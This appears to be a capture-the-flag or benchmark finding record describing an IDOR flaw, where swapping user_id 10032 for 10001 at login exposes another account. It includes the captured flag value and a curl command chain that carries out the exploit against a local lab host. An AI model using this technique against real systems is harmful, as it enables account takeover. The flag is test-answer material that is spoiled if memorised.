findings.title: IDOR - User ID Manipulation Exposes Flag
findings.description: The application uses user_id as a direct object reference in the session cookie. By manipulating the user_id parameter during login (changing from 10032 to 10001), an attacker can access another user's account and view sensitive information including the flag.
findings.evidence: flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665} - Found in the dashboard Welcome message when accessing user_id=10001

reproduction.command: curl -s -c /tmp/cookie.txt -X POST 'http://172.17.0.1:52849' -d 'username=test' -o /dev/null && curl -s -b /tmp/cookie.txt -X POST 'http://172.17.0.1:52849/password/test' -d 'user_id=10001&password=test' -o /dev/null && curl -s -b /tmp/cookie.txt 'http://172.17.0.1:52849/dashboard' | grep 'Welcome'
